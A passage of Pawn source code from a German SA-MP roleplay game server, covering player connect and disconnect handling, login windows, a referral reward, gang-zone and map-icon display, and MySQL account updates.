    Anion[playerid] = 0; imtut[playerid] = 0;auftragsid[playerid] = 0; anticheatpl[playerid] = 0; anticheatpl2w[playerid] = 0;anticheatpl2[playerid] = 0; hatobject[playerid] = 0; tutorialcp[playerid] = 0;
    rollmeet[playerid] = -1; rollmeet2[playerid] = -1; istdrinne[playerid] = 0; Mitglied[playerid] = -2;fmerken[playerid] = -1;		PlayerTrucker[playerid] = 0;PlayerTruckmodus[playerid] = 0; TruckSpritmodus[playerid] = 0;
    hathand[playerid] = -1; cpaktiv[playerid] = 0; Fahrschulcp[playerid] = 0; Fahrstunde[playerid] = 0; persobeantragt[playerid] = 0; playervehiclemerk[playerid] = -1;
	SetPlayerWeather(playerid,wetter); fischauswahl[playerid] = 0; PlayerKoks[playerid] = 0; angelnerlaubt[playerid] = 0; auslosexd[playerid] = 0; armytorspam[playerid] = 0;
	Musikboxdrinne[playerid] = 0; FalschesPasswort[playerid]= 0;
 	jpbereits[playerid] = 0;
 	SpielerInfo[playerid][upunkte] = 0;
	SpielerInfo[playerid][uTode] = 0;
	SpielerInfo[playerid][uKills] = 0;
	SpielerInfo[playerid][uTutorial] = 0;
	SpielerInfo[playerid][uSpawn] = 0;
	SpielerInfo[playerid][uJahr] = 0;
	SpielerInfo[playerid][uMonat] = 0;
	SpielerInfo[playerid][uTag] = 0;
	SpielerInfo[playerid][uGeschlecht] = 0;
	Wertereset(playerid);
	SpielerInfo[playerid][ustarttut] = 0;SpielerInfo[playerid][ufMissionen] = 0;SpielerInfo[playerid][ufBeruf] = 0;
	SpielerInfo[playerid][ufATM] = 0;SpielerInfo[playerid][ufAutokauf] = 0;SpielerInfo[playerid][ufShop] = 0;SpielerInfo[playerid][ufHandy] = 0;SpielerInfo[playerid][ufAngel] = 0;SpielerInfo[playerid][ufMarkt] = 0;
	SpielerInfo[playerid][ufGras] = 0;SpielerInfo[playerid][ufSchwarz] = 0;SpielerInfo[playerid][ufBombe] = 0;SpielerInfo[playerid][ufWaffenschein] = 0;SpielerInfo[playerid][ufFuhrerschein] = 0;SpielerInfo[playerid][ufPerso] = 0;SpielerInfo[playerid][uMissionen] = 0;
    //SetTimerEx("Updateracc",2000,1,"d",playerid);
	GebeLeben(playerid,99.8);
	PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/CISound.mp3");
	SendClientMessage(playerid,0x3C89C8FF,"Die Welt wird geladen, einen moment ...");
	rob_targetID[playerid]=-1;
	//Missionenan[playerid] = 0;
    for(new x = 1; x < 13; x++)
	{
	    SpielerWaffen[playerid][x][sWaffe] = 0;
	    SpielerWaffen[playerid][x][sMuni] = 0;
	}
	if(IsPlayerNPC(playerid))
	{
	    SpielerInfo[playerid][uEingeloggt] = 1;
		SpawnPlayer(playerid);
	}
	else
	{
	    mbekommen[playerid] = 0; warn[playerid] = 0;waitwarn[playerid] = 0; failpw[playerid] = 1;
	    ppMaske[playerid] = 0;autokey[playerid] = -1; autovid[playerid] = -1; autokey[playerid] = -1; autopreis[playerid] = -1; idein[playerid] = -1; adienst[playerid] = 0;
	    Merkenid[playerid] = -1; machtbereits[playerid]= 0; Maskex[playerid] = false;
	    FrakAutochoose[playerid] = -1,Autochoose[playerid] = -1,SpielerInfo[playerid][uAdmin] = 0, SpielerInfo[playerid][uLeiter] = 0,SpielerInfo[playerid][uMitglied] = 0, MoebelKategorie[playerid] = -1;
	    SpielerInfo[playerid][uHausschluessel]= -1; SpielerInfo[playerid][uGeschaeftschluessel]= -1; SpielerInfo[playerid][uGWD]= -1;SpielerInfo[playerid][uWantedLevel] = 0;Kreditsumme[playerid] = 0.00; Kreditrate[playerid] = 0; SpielerInfo[playerid][uKredit] = 0;
	    SpielerInfo[playerid][uGeld] = 0.00; SpielerInfo[playerid][uKonto] = 0.00; SpielerInfo[playerid][uPerso] = 0; SpielerInfo[playerid][uRang] = 0; SpielerInfo[playerid][uArbeitslosengeld] = 0; SpielerInfo[playerid][uTod] = 0;
	    AutosFahrbar[playerid] = 0;HandyAn[playerid] = 0;InventarShow[playerid] = 0; SpielerInfo[playerid][uHandy] = 0;SpielerInfo[playerid][uHandynummer] = 0;SpielerInfo[playerid][uTelefonbuch] = 0;SpielerInfo[playerid][uTelefonbucheintrag] = 0;
		Handycall[playerid] = -1; SpielerInfo[playerid][uFuehrerschein] = 0; SpielerInfo[playerid][uLevel] = 0;SpielerInfo[playerid][uRollerschein] = 0; SpielerInfo[playerid][uMotorradschein] = 0; SpielerInfo[playerid][uHelischein] = 0;
		SpielerInfo[playerid][uTheorie] = 0; SpielerInfo[playerid][uWaffenschein] = 0; SpielerInfo[playerid][uLKWschein] = 0; SpielerInfo[playerid][uBootsschein] = 0;
		SpielerInfo[playerid][uSpielzeitLogin] = gettime(); Fahrpruefung[playerid] = 0; FahrschulPruef[playerid] = 0; SpielerInfo[playerid][uAFK] = 0; SpielerInfo[playerid][uDesktop] = gettime(); Buslinie[playerid] = 0;
		AntiCheat[playerid][cAnti] = 2; SpawnSchutz[playerid] = 0;Auftrag[playerid][0] = -1; TutZeit[playerid] = 0; AntiFlood[playerid][0] = gettime(); AntiFlood[playerid][1] = gettime(); AntiCheat[playerid][cTeleportWarns] = 0;
        AntiCheat[playerid][cAirbreakWarns] = 0; SpielerInfo[playerid][uKnastZeit] = 0;SpielerInfo[playerid][uGefangen] = 0; Fahrpreis[playerid] = 0; HatTaser[playerid] = 0;
		TogglePlayerSpectating(playerid,true); SpielerInfo[playerid][uBan] = 0; Ticketmerk[playerid] = -1;SpielerInfo[playerid][uJob] = 0;
		SetPlayerColor(playerid,0xFFFFFFFF);
		SetPlayerSkillLevel(playerid, WEAPONSKILL_SAWNOFF_SHOTGUN, 1);
		SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL, 1);
	    SpielerInfo[playerid][uEingeloggt] = 0; SpielerInfo[playerid][uStrafCP] = -1;
	   	Route[playerid][RouteID] = (-1);
		Route[playerid][Calculating] = 0;
		HatAuftrag[playerid] = -1;
		bizidmerk[playerid] = -1;
		eristsani[playerid] = -1;
		Route[playerid][Ziel] = (-1);
	    PlayerTextdraws(playerid);
		SpielerInfo[playerid][uHunger] = 100,Spectate[playerid] = -1,Respray[playerid] = 0;
		Tune_Farbe1[playerid] = -1;InventarValue[playerid] = 9;
		TaxiFahrer[playerid] = -1;
		//ShowPlayerDialog(playerid,DIALOG_PW,DIALOG_STYLE_INPUT,"Passwort eingeben","Gebe das Server Passwort ein:","Absenden","Abbrechen");
  		SetTimerEx("loginfenster",2000,0,"d",playerid);
		SetTimerEx("ladefenster",2001,0,"d",playerid);
	}
	return 1;
}
forward Wertereset(playerid);
public Wertereset(playerid)
{
    SpielerInfo[playerid][uLevel] = 0;
	SpielerInfo[playerid][uKredit] = 0;
	SpielerInfo[playerid][uAdmin] = 0;
	SpielerInfo[playerid][uPerso] = 0;
	SpielerInfo[playerid][uLeiter] = 0;
	SpielerInfo[playerid][uMitglied] = 0;
	SpielerInfo[playerid][uRang] = 0;
	SpielerInfo[playerid][uInt] = 0;
	SpielerInfo[playerid][uWelt] = 0;
	SpielerInfo[playerid][uFuehrerschein] = 0;
	SpielerInfo[playerid][uZiviSkin] = 0;
	SpielerInfo[playerid][uZiviFrak] = 0;
	SpielerInfo[playerid][uHelischein] = 0;
	SpielerInfo[playerid][uBootsschein] = 0;
	SpielerInfo[playerid][uMotorradschein] = 0;
	SpielerInfo[playerid][uRollerschein] = 0;
	SpielerInfo[playerid][uLKWschein] = 0;
	SpielerInfo[playerid][uWaffenschein] = 0;
	SpielerInfo[playerid][uTheorie] = 0;
	SpielerInfo[playerid][uKnastZeit] = 0;
	SpielerInfo[playerid][uGefangen] = 0;
	SpielerInfo[playerid][uWantedLevel] = 0;
	SpielerInfo[playerid][uHausschluessel] = -1;
	SpielerInfo[playerid][uGeschaeftschluessel] = -1;
	SpielerInfo[playerid][uPayDaySekunden] = 0;
	SpielerInfo[playerid][uStumm] = 0;
	SpielerInfo[playerid][uEingeloggt] = 0;
	SpielerInfo[playerid][uSpielzeit] = 0;
	SpielerInfo[playerid][uSpielzeitLogin] = 0;
	SpielerInfo[playerid][uAFK] = 0;
	SpielerInfo[playerid][uDesktop] = 0;
	SpielerInfo[playerid][uHunger] = 100;
	SpielerInfo[playerid][uJob] = 0;
	SpielerInfo[playerid][uWerbunguser] = 0;
	SpielerInfo[playerid][uVerstrahlt] = 0;
	SpielerInfo[playerid][uTod] = 0;
	SpielerInfo[playerid][uArbeitslosengeld] = 0;
	SpielerInfo[playerid][uTode] = 0;
	SpielerInfo[playerid][uKills] = 0;
	SpielerInfo[playerid][uWarns] = 0;
	SpielerInfo[playerid][uHandy] = 0;
	SpielerInfo[playerid][uHandynummer] = 0;
	SpielerInfo[playerid][uTelefonbuch] = 0;
	SpielerInfo[playerid][uTelefonbucheintrag] = 0;
	SpielerInfo[playerid][uTimebann] = 0;
	SpielerInfo[playerid][uGras] = 0;
	SpielerInfo[playerid][uKoks] = 0;
	SpielerInfo[playerid][uLSD] = 0;
	SpielerInfo[playerid][upunkte] = 0;
	SpielerInfo[playerid][uGeschlecht] = 0;
	SpielerInfo[playerid][uStrafe] = 0;
	SpielerInfo[playerid][uStrafCP] = 0;
	SpielerInfo[playerid][uTutorial] = 0;
	SpielerInfo[playerid][uRepair] = 0;
	SpielerInfo[playerid][sitzungsid] = 0;
	SpielerInfo[playerid][contime] = 0;
	SpielerInfo[playerid][funkstatus] = 0;
	SpielerInfo[playerid][uJahr] = 0;
	SpielerInfo[playerid][uMonat] = 0;
	SpielerInfo[playerid][uTag] = 0;
	SpielerInfo[playerid][uGWD] = 0;
	SpielerInfo[playerid][ustarttut] = 0;
	SpielerInfo[playerid][uSpawn] = 0;
}
forward ladefenster(playerid);
public ladefenster(playerid)
{
    Teleport(playerid,1751.2831,-8116.3999,23.6663);
	SetPlayerCameraPos(playerid,1750.0637, -8118.0957, 25.1300);
	SetPlayerCameraLookAt(playerid,1749.3821, -8117.3765, 25.0050);
	return 1;
}
forward UserWerbenUser(playerid);
public UserWerbenUser(playerid)
{
	new string[265],data[7];
    format(string,sizeof(string),"userID='%d'",SpielerInfo[playerid][uID]);
	if(mysqlget("geworben",string,"geworbenvon",data))
	{
	    if(SpielerInfo[playerid][uWerbunguser] == 1)
	    {
		    if(SpielerInfo[playerid][uLevel] >= 6)
		    {
		        Userwerben[playerid] = -1;
		        Userwerben[playerid] = strval(data);
				for(new s = 0; s < GetMaxPlayers(); s++)
				{
				    if(SpielerInfo[s][uID] == Userwerben[playerid])
				    {
				        if(SpielerInfo[s][uLevel] >= 6)
				        {
				            SpielerInfo[playerid][uWerbunguser] = 0;
				            format(string,sizeof(string),"Du erhälst 2500$ Belohnung für das Werben von %s.",PlayerName(playerid));
				            SendClientMessage(s,COLOR_YELLOW,string);
				            format(string,sizeof(string),"%s erhält 2500$ Belohnung für das Werben von dir.",PlayerName(s));
				            SendClientMessage(playerid,COLOR_YELLOW,string);
				            GebeGeld(s,2500);
				            format(string,sizeof(string),"DELETE FROM `geworben` WHERE userID = %i",SpielerInfo[playerid][uID]);
			            	mysql_query(dbhandle,string);
			            	break;
				        }
				    }
				}
		    }
		}
	}
	return 1;
}
forward loginfenster(playerid);
public loginfenster(playerid)
{
	new string[70],data[7];
	format(string,sizeof(string),"Name='%s'",PlayerName(playerid));
	if(!mysqlget("login",string,"ID",data))
	{
		for(new x = 0; x < sizeof(RegisterDraw); x++) TextDrawShowForPlayer(playerid,RegisterDraw[x]);
		SelectTextDraw(playerid,8978431);
		return 1;
	}
	SpielerInfo[playerid][uID] = strval(data);
	for(new x = 0; x < sizeof(LoginDraw); x++) TextDrawShowForPlayer(playerid,LoginDraw[x]);
	SelectTextDraw(playerid,8978431);
	format(string,sizeof string,"userID='%d'",SpielerInfo[playerid][uID]);
	mysqlget("user",string,"X",data);
	SpielerInfo[playerid][uPosX] = floatstr(data);
	format(string,sizeof string,"userID='%d'",SpielerInfo[playerid][uID]);
	mysqlget("user",string,"Y",data);
	SpielerInfo[playerid][uPosY] = floatstr(data);
	format(string,sizeof string,"userID='%d'",SpielerInfo[playerid][uID]);
	mysqlget("user",string,"Z",data);
	SpielerInfo[playerid][uPosZ] = floatstr(data);
	Streamer_UpdateEx(playerid,SpielerInfo[playerid][uPosX],SpielerInfo[playerid][uPosY],SpielerInfo[playerid][uPosZ]);
	Streamer_ToggleIdleUpdate(playerid, true);
	SetPlayerVirtualWorld(playerid,2);
	return 1;
}
forward ladgangicon(playerid);
public  ladgangicon(playerid)
{
	GangZoneShowForPlayer(playerid, industrie9, 0x5A5A5AFF);
    GangZoneShowForPlayer(playerid, industrie10, 0x5A5A5AFF);
    GangZoneShowForPlayer(playerid, industrie11, 0x5A5A5AFF);
    GangZoneShowForPlayer(playerid, industrie12, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, LSHaupt, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, BSN2, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, StrasseLSklein1, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, BallasLS1, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, BallasLS2, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, Street_Noobspawn1, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, Street_Noobspawn2, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, Spawn1, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, DonatorIsland1, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, Autobahn1, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, Portlandstreet1, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, Portland1, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, Bergstreet, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, SF1, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, LV_SF, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, SF_LV, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, LV1, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, LS_Street, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, Bergland, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, Bergland2, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, Armybase, 0x5A5A5AFF);
	GangZoneShowForPlayer(playerid, EventHouse, 0x5A5A5AFF);
    GangZoneShowForPlayer(playerid, LSStrasse1, 0x000000FF);
    GangZoneShowForPlayer(playerid, LSStrasse2, 0x000000FF);
    GangZoneShowForPlayer(playerid, kleinparkplatz1, 0x000000FF);
    GangZoneShowForPlayer(playerid, LSPDStrasse3, 0x000000FF);
	GangZoneShowForPlayer(playerid, LSLV1, 0x000000FF);
	GangZoneShowForPlayer(playerid, Wohnhauser1 , 0x000000FF);
	GangZoneShowForPlayer(playerid, HauptS1, 0x000000FF);
	GangZoneShowForPlayer(playerid, HauptS2, 0x000000FF);
	GangZoneShowForPlayer(playerid, BSN1, 0x000000FF);
	GangZoneShowForPlayer(playerid, Kreuzung1, 0x000000FF);
	GangZoneShowForPlayer(playerid, Kreuzung2, 0x000000FF);
	GangZoneShowForPlayer(playerid, Ballas1, 0x000000FF);
	GangZoneShowForPlayer(playerid, Ballas2, 0x000000FF);
	GangZoneShowForPlayer(playerid, Ballas3, 0x000000FF);
	GangZoneShowForPlayer(playerid, Ballas4, 0x000000FF);
	GangZoneShowForPlayer(playerid, WrongHillStr1, 0x000000FF);
	GangZoneShowForPlayer(playerid, WrongHolle1, 0x000000FF);
	GangZoneShowForPlayer(playerid, GangStrasseHaupt1, 0x000000FF);
	GangZoneShowForPlayer(playerid, GangstrasseLinks1, 0x000000FF);
	GangZoneShowForPlayer(playerid, GangstrasseHInten1, 0x000000FF);
	GangZoneShowForPlayer(playerid, GangstrasseRechts1, 0x000000FF);
	GangZoneShowForPlayer(playerid, GangstrasseMitteLinks1, 0x000000FF);
	GangZoneShowForPlayer(playerid, GangstrasseMitteRechts1, 0x000000FF);
	GangZoneShowForPlayer(playerid, LVSFStrasse1, 0x000000FF);
	GangZoneShowForPlayer(playerid, LVStrasse, 0x000000FF);
	GangZoneShowForPlayer(playerid, LVStrasseganzhinten1, 0x000000FF);
	GangZoneShowForPlayer(playerid, LVStrassehintenfw1, 0x000000FF);
	GangZoneShowForPlayer(playerid, SFWohnStrasse1, 0x000000FF);
	GangZoneShowForPlayer(playerid, Hauptstrasselang1SF, 0x000000FF);
	GangZoneShowForPlayer(playerid, HauptstrassekurzSF1, 0x000000FF);
	GangZoneShowForPlayer(playerid, SFStrassehinten1, 0x000000FF);
	GangZoneShowForPlayer(playerid, MullSF1, 0x000000FF);
	GangZoneShowForPlayer(playerid, SFAutobahnstr1, 0x000000FF);
	GangZoneShowForPlayer(playerid, LSzurKurve1, 0x000000FF);
	GangZoneShowForPlayer(playerid, EckeVergessen1, 0x000000FF);
	GangZoneShowForPlayer(playerid, EckeVergessen2, 0x000000FF);
	GangZoneShowForPlayer(playerid, Autobahnsure1, 0x000000FF);
	GangZoneShowForPlayer(playerid, Spawnstrasse1, 0x000000FF);
	GangZoneShowForPlayer(playerid, Armystrasse, 0x000000FF);
	GangZoneShowForPlayer(playerid, EventStrasse, 0x000000FF);
	GangZoneShowForPlayer(playerid, StreetLV1, 0x000000FF);
    GangZoneShowForPlayer(playerid, StreetLV3, 0x000000FF);
    GangZoneShowForPlayer(playerid, StreetLV4, 0x000000FF);
    GangZoneShowForPlayer(playerid, StreetLV5, 0x000000FF);
    GangZoneShowForPlayer(playerid, StreetLV6, 0x000000FF);
    GangZoneShowForPlayer(playerid, LVAirfieldStreeet1, 0x5A5A5AFF);
    GangZoneShowForPlayer(playerid, LVAirfieldStreeet2, 0x5A5A5AFF);
    GangZoneShowForPlayer(playerid, LVAirfieldStreeet3, 0x5A5A5AFF);
    GangZoneShowForPlayer(playerid, industrie1, 0x000000FF);
	GangZoneShowForPlayer(playerid, industrie2, 0x000000FF);
	GangZoneShowForPlayer(playerid, industrie3, 0x000000FF);
	GangZoneShowForPlayer(playerid, industrie4, 0x000000FF);
	GangZoneShowForPlayer(playerid, industrie5, 0x000000FF);
	GangZoneShowForPlayer(playerid, industrie6, 0x000000FF);
	GangZoneShowForPlayer(playerid, industrie7, 0x000000FF);
	GangZoneShowForPlayer(playerid, industrie8, 0x000000FF);
	GangZoneShowForPlayer(playerid, Flughafenzone, 0xFFAA00FF);
	//Neu seit 07.04.2016
	for(new x = 0; x < 5; x++)
	{
		if(GWInfo[x][GWBesitzer] == 7)
		{
		    GangZoneShowForPlayer(playerid, GWInfo[x][GWZone], COLOR_BALLAS);
		}
		if(GWInfo[x][GWBesitzer] == 8)
		{
		    GangZoneShowForPlayer(playerid, GWInfo[x][GWZone], COLOR_GROVE);
		}
		if(GWInfo[x][GWBesitzer] == 9)
		{
		    GangZoneShowForPlayer(playerid, GWInfo[x][GWZone], COLOR_ATZE);
		}
		if(GWInfo[x][GWBesitzer] == 10)
		{
		    GangZoneShowForPlayer(playerid, GWInfo[x][GWZone], COLOR_LCN);
		}
		if(GWInfo[x][GWBesitzer] == 11)
		{
		    GangZoneShowForPlayer(playerid, GWInfo[x][GWZone], COLOR_YAKUZA);
		}
		if(GWInfo[x][GWBesitzer] == 16)
		{
		    GangZoneShowForPlayer(playerid, GWInfo[x][GWZone], COLOR_VAGOS);
		}
		if(GWInfo[x][GWBesitzer] == 17)
		{
		    GangZoneShowForPlayer(playerid, GWInfo[x][GWZone], COLOR_Mayans_MC);
		}
	}

    SetPlayerMapIcon(playerid,0, 1780.1118,-9315.2852,3.9835, 45, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,1, 1565.2936,-9523.4561,6.7050, 30, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,2, 1606.4022,-9336.2090,6.1488, 17, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,3, 1727.6423,-9254.6465,3.9637, 55, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,4, 1836.4844,-9251.2002,3.9743, 38, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,5, 1761.8427,-9206.0049,4.3997, 10, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,6, 1724.4685,-8947.1758,5.7710, 40, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,7, 1712.3547,-8834.7617,3.9789, 59, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,8, 1599.5293,-8542.9678,1.9040, 52, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,9, 1587.6464,-8500.7520,1.9014, 53, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,10, 1601.1154,-8451.2813,6.6257, 18, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,11, 1678.9802,-9324.0293,4.1502, 27, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,12, 4401.8428,-7624.2822,4.4750,62, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,13, 4225.7749,-7630.7939,4.7255,58, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,14,6362.9082,-7765.1270,4.3759,38, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,15,6423.0645,-7724.5635,4.6435,52, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,16,6488.8232,-7871.6992,4.6881,30, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,17,6558.8965,-7791.8350,4.5025,55, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,18,6397.0493,-9344.7588,4.4323,34, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,19,6293.3477,-9347.4531,4.4964,51, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,20,6459.8027,-7728.3628,4.3736,20, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,21,6602.5728,-7871.4111,4.0082,29, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,22,6419.8208,-9145.4287,4.4061,17, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,23,6303.6919,-7829.6938,4.4152,17, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,24,6464.7974,-7627.6870,4.4096,33, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,25,6428.9771,-7833.5073,4.0034,63, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,26,6229.6235,-7852.6431,3.8416,19, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,27,6449.0352,-8141.7822,3.9713,9, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,28,6351.5405,-9136.4287,5.1618,60, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,29,5773.4028,-9260.4561,4.0402,11, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,30,4551.4214,-9325.8564,3.9800,11, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,31,5399.8115,-9285.7803,4.0293,42, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,32,4490.5845,-8623.7227,4.0275,33, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,32,4094.4719,-9282.6504,4.0378,51, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,33,3723.0439,-9317.4150,4.0288,26, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,34,3168.0671,-9249.9512,4.0298,39, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,35,2490.9763,-9308.0254,4.0248,42, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,36,1618.0416,-9204.3906,5.6282,2, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,38,5995.0835,-9875.6035,8.8096,5, 0, MAPICON_LOCAL);
    SetPlayerMapIcon(playerid,39,51772.3525,-9360.4844,4.4124,20, 0, MAPICON_LOCAL);
	return 1;
}


public OnPlayerDisconnect(playerid, reason)
{
    Geldnichterhalten(playerid);
    KillTimer(Admindiensttimer[playerid]);
    KillTimer(Angeltimerxd[playerid]);
    new vehi = GetPlayerVehicleID(playerid);
    if(vehi == geldtransporter)
	{
	    if(playerid == geldtransporterdriver)
	    {
	        geldtransporterdriver = -1;
	    }
	}
    if(playerid == bombenspieler)
    {
        Atombombeabbruch();
    }
    if(inROB[playerid] == true)
    {
        inROB[playerid]=false;
        rob_sperre[playerid]=false;
        KillTimer(robTM2[playerid]);
        KillTimer(robTM[playerid]);
    }
	/*LastOfflineTime = gettime();
    format(LastOfflinePlayer,64,"%s",PlayerName(playerid));*/

    if(Musikbox[0] == playerid)
    {
        Musikbox[0] = -1;
        BoomBox[0][0] = 0;
        BoomBox[0][1] = 0;
        BoomBox[0][2] = 0;
        Musikboxm[0] = 0;
        Verstauen(playerid,2226,1);
		DestroyDynamicObject(Musikobject[0]);
    }
	if(Musikbox[1] == playerid)
    {
        Musikbox[1] = -1;
        BoomBox[1][0] = 0;
        BoomBox[1][1] = 0;
        BoomBox[1][2] = 0;
		Musikboxm[1] = 0;
		Verstauen(playerid,2226,1);
		DestroyDynamicObject(Musikobject[1]);
    }
	if(Musikbox[2] == playerid)
    {
        Musikbox[2] = -1;
        BoomBox[2][0] = 0;
        BoomBox[2][1] = 0;
        BoomBox[2][2] = 0;
        Musikboxm[2] = 0;
        Verstauen(playerid,2226,1);
		DestroyDynamicObject(Musikobject[2]);
    }
    new disconnection[80];
    format(disconnection,sizeof(disconnection),"%s[%d]: hat den Server verlassen",PlayerName(playerid),playerid);
    SendClientMessageToAll(0xC10000FF,disconnection);
	if(PlayerTrucker[playerid] == 1)
	{
	    vehicleprodukte[playervehiclemerk[playerid]] = 0;
	    SetVehicleToRespawn(playervehiclemerk[playerid]);
	}
	if(PlayerTrucker[playerid] == 2)
	{
	    vehicleprodukte[playervehiclemerk[playerid]] = 0;
	    SetVehicleToRespawn(playervehiclemerk[playerid]);
	}
	if(HatAuftrag[playerid] >= 0 && eristsani[playerid] == -1)
	{
	    new str[140];
		format(str,sizeof(str),"%s ist Offline, du kannst nun einen neuen Auftrag annehmen.",PlayerName(playerid));
		SendClientMessage(HatAuftrag[playerid],COLOR_ORANGE,str);
	    HatAuftrag[HatAuftrag[playerid]] = -1;
	    HatAuftrag[playerid] = -1;
	    eristsani[playerid] = -1;
	    SpielerInfo[playerid][uTod] = 4;
	    KillTimer(timerxd[playerid]);
	}
	if(HatAuftrag[playerid] >= 0 && eristsani[playerid] == 1)
	{
	    new str[140];
		format(str,sizeof(str),"Fire & Rescue %s ist Offline gegangen, du kommst für eine kurze Zeit ins Krankenhaus.",PlayerName(playerid));
		SendClientMessage(HatAuftrag[playerid],COLOR_ORANGE,str);
		ClearAnimations(HatAuftrag[playerid]);
	    Freeze(HatAuftrag[playerid]);
	    SetPlayerVirtualWorld(HatAuftrag[playerid],0);
		new Float:LS12 = GetPlayerDistanceFromPoint(HatAuftrag[playerid], 1763.3220,-9308.4346,4.4164);
	    new Float:SF12 = GetPlayerDistanceFromPoint(HatAuftrag[playerid], 6452.5493,-7724.9258,4.3736);
	    if(LS12 > SF12)
	    {
	        Teleport(HatAuftrag[playerid],6456.0259,-7729.9888,4.3736);
	        SetPlayerCameraPos(HatAuftrag[playerid],6426.5171,-7712.2026,4.2186+7);
	        SetPlayerCameraLookAt(HatAuftrag[playerid],6456.0259,-7729.9888,4.3736);
	        SendClientMessage(HatAuftrag[playerid],COLOR_ORANGE,"Du wirst im Krankenhaus Santa Felton behandelt. Für eine kürzere Zeit!");
	    }
	    else if(SF12 > LS12)
	    {
	    	new rand = random(sizeof(khspawn));
	        SendClientMessage(playerid,COLOR_ORANGE,"Du wirst im Krankenhaus Lake Sorten behandelt. Für eine kürzere Zeit!");
	        Teleport(HatAuftrag[playerid],khspawn[rand][0], khspawn[rand][1], khspawn[rand][2]);
	        SetPlayerCameraPos(HatAuftrag[playerid],1768.8988,-9323.4424,7.9100+1);
	        SetPlayerCameraLookAt(HatAuftrag[playerid],khspawn[rand][0], khspawn[rand][1], khspawn[rand][2]);
	        ApplyAnimation(HatAuftrag[playerid],"BEACH", "bather", 4.0, 1, 0, 0, 0, 0);
	        ApplyAnimation(HatAuftrag[playerid],"BEACH", "bather", 4.0, 1, 0, 0, 0, 0);
	        SetPlayerFacingAngle(playerid,180);
	    }
     	SpielerInfo[HatAuftrag[playerid]][uTod] = 1;
     	SetTimerEx("Leben",20000,0,"d",HatAuftrag[playerid]);
     	HatAuftrag[HatAuftrag[playerid]] = -1;
	    HatAuftrag[playerid] = -1;
	    eristsani[playerid] = -1;
	    KillTimer(timerxd[playerid]);
	}
	if(SpielerInfo[playerid][uTod] > 0)
	{
	    SpielerInfo[playerid][uTod] = 4;
	    KillTimer(timerxd2[playerid]);
	}
	KillTimer(pfltimer[playerid]);
	if(SpielerInfo[playerid][uEingeloggt] == 1)
	{
	    new string[128],query[300];
	    AccountSpeichern(playerid);
	    for(new x = 0; x < 2; x++) if(SAuto[playerid][x][sID] > -1) DestroyVehicle(SAuto[playerid][x][sID]);
		DestroyDynamicObject(CDrogen[playerid][drogenobject]);
		Delete3DTextLabel(CDrogen[playerid][drogenlabel]);
		CDrogen[playerid][drogenlabel] = Text3D:INVALID_3DTEXT_ID;
		format(string,sizeof string,"UPDATE `user` SET eingeloggt='0' WHERE userID='%d'",SpielerInfo[playerid][uID]);
		mysql_query(dbhandle, string);
    	format(string, sizeof(string), "UPDATE usersitzungen SET logout='%i' WHERE id='%i'", gettime(),SpielerInfo[playerid][sitzungsid]);
    	mysql_query(dbhandle, string);
    	printf("%s",query);
	}
